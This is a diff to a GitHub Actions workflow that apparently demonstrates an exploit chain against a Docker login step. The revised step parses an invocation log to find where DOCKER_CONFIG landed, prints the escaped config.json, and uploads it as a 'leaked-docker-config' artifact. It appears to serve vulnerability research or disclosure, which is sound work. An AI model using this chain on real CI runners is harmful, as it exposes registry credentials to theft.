@@ -49,23 +49,30 @@ jobs:
           logout: false
 
       - name: Verify escaped write
+        id: verify
         shell: bash
         run: |
           set -euo pipefail
           echo "RUNNER_TEMP=$RUNNER_TEMP"
-          if [ -f "$RUNNER_TEMP/leak/config.json" ]; then
-            echo "FOUND escaped config at $RUNNER_TEMP/leak/config.json"
-            cat "$RUNNER_TEMP/leak/config.json"
-          else
-            echo "MISSING expected escaped file"
-            exit 1
-          fi
+          echo "HOME=$HOME"
           echo "---- docker invocation log ----"
           cat "$RUNNER_TEMP/docker-invocations.log"
+
+          CFG="$(sed -n 's/.*DOCKER_CONFIG=\(.*\) args=.*/\1/p' "$RUNNER_TEMP/docker-invocations.log" | tail -n1)"
+          echo "Resolved DOCKER_CONFIG: $CFG"
+
+          test -n "$CFG"
+          test -f "$CFG/config.json"
+
+          echo "FOUND escaped config at $CFG/config.json"
+          cat "$CFG/config.json"
+
+          echo "cfg=$CFG" >> "$GITHUB_OUTPUT"
 
       - name: Upload leaked file (exploit chain proof)
         uses: actions/upload-artifact@v4
         with:
           name: leaked-docker-config
-          path: ${{ runner.temp }}/leak/config.json
+          path: ${{ steps.verify.outputs.cfg }}/config.json
           if-no-files-found: error
+
